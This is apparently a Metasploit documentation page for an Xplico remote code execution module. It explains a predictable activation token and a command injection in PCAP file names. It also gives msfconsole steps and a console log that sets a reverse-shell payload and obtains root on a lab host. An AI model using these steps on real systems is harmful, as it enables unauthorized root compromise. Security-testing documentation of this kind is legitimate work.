{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/xplico_exec","result":{"data":{"moduleMetadataJson":{"id":"a15daab7-a1c4-5368-8102-939734bd6a16","name":"Xplico Remote Code Execution","fullname":"exploit/linux/http/xplico_exec","description":"This module exploits command injection vulnerability. Unauthenticated users can register a new account and then execute a terminal\n        command under the context of the root user.\n\n        The specific flaw exists within the Xplico, which listens on TCP port 9876 by default. The goal of Xplico is extract from an internet\n        traffic capture the applications data contained. There is a hidden end-point at inside of the Xplico that allow anyone to create\n        a new user. Once the user created through /users/register endpoint, it must be activated via activation e-mail. After the registration Xplico try\n        to send e-mail that contains activation code. Unfortunetly, this e-mail probably not gonna reach to the given e-mail address on most of installation.\n        But it's possible to calculate exactly same token value because of insecure cryptographic random string generator function usage.\n\n        One of the feature of Xplico is related to the parsing PCAP files. Once PCAP file uploaded, Xplico execute an operating system command in order to calculate checksum\n        of the file. Name of the for this operation is direclty taken from user input and then used at inside of the command without proper input validation.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/xplico_exec","documentationSlug":"/modules/documentation/exploit/linux/http/xplico_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits command injection vulnerability. Unauthenticated users can register a new account and then execute a terminal command under the context of the root user.</p>\n<p>The specific flaw exists within the Xplico, which listens on TCP port 9876 by default. The goal of Xplico is extract from an internet\ntraffic capture the applications data contained. There is a hidden end-point at inside of the Xplico that allow anyone to create\na new user. Once the user created through /users/register endpoint, it must be activated via activation e-mail. After the registration Xplico try\nto send e-mail that contains activation code. Unfortunetly, this e-mail probably not gonna reach to the given e-mail address on most of installation.\nBut it's possible to calculate exactly same token value because of insecure cryptographic random string generator function usage.</p>\n<p>One of the feature of Xplico is related to the parsing PCAP files. Once PCAP file uploaded, Xplico execute an operating system command in order to calculate checksum\nof the file. Name of the for this operation is direclty taken from user input and then used at inside of the command without proper input validation.</p>\n<p><strong>Vulnerable Application Installation Steps</strong></p>\n<p>Follow instruction from \"from sourceforge\" section at following URL. Don't forget install version 1.2.0 instead of 1.0.0. At the time of this writing, installation commands contains command for version 1.0.0 </p>\n<p><a href=\"http://wiki.xplico.org/doku.php?id=ubuntu\">http://wiki.xplico.org/doku.php?id=ubuntu</a></p>\n<p>You may also give a try to virtualbox image provided by maintainer of Xplico. I've tested this module against Xplico-1.1.0-ubuntu-13.10-i386.ova.\n<a href=\"https://sourceforge.net/projects/xplico/files/VirtualBox%20images/\">https://sourceforge.net/projects/xplico/files/VirtualBox%20images/</a></p>\n<p>Username of the virtualbox image is \"ubuntu\" and password is \"reverse\".</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>A successful check of the exploit will look like this:</p>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Start <code class=\"language-text\">msfconsole</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">use exploit/linux/http/securityonion_xplico_exec</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set <code class=\"language-text\">RHOST</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set <code class=\"language-text\">PAYLOAD cmd/unix/reverse_awk</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set <code class=\"language-text\">LHOST</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Run <code class=\"language-text\">exploit</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you are seeing <code class=\"language-text\">New user successfully registered</code> in console.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you are seeing <code class=\"language-text\">User successfully activated</code> in console.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you are seeing <code class=\"language-text\">Successfully authenticated</code> in console.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you are seeing <code class=\"language-text\">New Case successfully creted</code> in console.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you are seeing <code class=\"language-text\">New Sols successfully creted</code> in console.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you are seeing <code class=\"language-text\">PCAP successfully uploaded. Pcap parser is going to start on server side</code> in console.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you are getting <code class=\"language-text\">We are at PCAP decoding phase. Little bit more patience...</code> in console.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you have your root shell.</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/securityonion_xplico_exec\nmsf exploit(securityonion_xplico_exec) &gt; set RHOST 12.0.0.30\nRHOST =&gt; 12.0.0.30\nmsf exploit(securityonion_xplico_exec) &gt; \nmsf exploit(securityonion_xplico_exec) &gt; exploit \n\n[-] Exploit failed: A payload has not been selected.\n[*] Exploit completed, but no session was created.\nmsf exploit(securityonion_xplico_exec) &gt; set payload cmd/unix/\nset payload cmd/unix/generic         set payload cmd/unix/reverse_netcat\nset payload cmd/unix/reverse_awk     \nmsf exploit(securityonion_xplico_exec) &gt; set payload cmd/unix/reverse_awk \npayload =&gt; cmd/unix/reverse_awk\nmsf exploit(securityonion_xplico_exec) &gt; set LHOST 12.0.0.1 \nLHOST =&gt; 12.0.0.1\nmsf exploit(securityonion_xplico_exec) &gt; exploit \n\n[*] Started reverse TCP handler on 12.0.0.1:4444 \n[*] Initiating new session on server side\n[*] Registering a new user\n[+] New user successfully registered\n[*] Username: mwbvnyowr\n[*] Password: gHPkAvCTXFDVcfTwaAmfoJUoMNHNDIDT\n[*] Calculating em_key code of the user\n[*] Activating user with em_key = 159d4af63472e2a47e3f3c5c11205a5e\n[+] User successfully activated\n[*] Authenticating with our activated new user\n[+] Successfully authenticated\n[*] Creating new case\n[+] New Case successfully creted. Our pol_id = 36\n[*] Creating new xplico session for pcap\n[+] New Sols successfully creted. Our sol_id = 54\n[*] Uploading malformed PCAP file\n[+] PCAP successfully uploaded. Pcap parser is going to start on server side.\n[*] Parsing has started. Wait for parser to get the job done...\n[+] We are at PCAP decoding phase. Little bit more patience...\n[+] We are at PCAP decoding phase. Little bit more patience...\n[+] We are at PCAP decoding phase. Little bit more patience...\n[*] Command shell session 1 opened (12.0.0.1:4444 -&gt; 12.0.0.30:39782) at 2017-11-08 14:44:52 +0300\n\nid\nuid=0(root) gid=0(root) groups=0(root)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"a15daab7-a1c4-5368-8102-939734bd6a16"}}}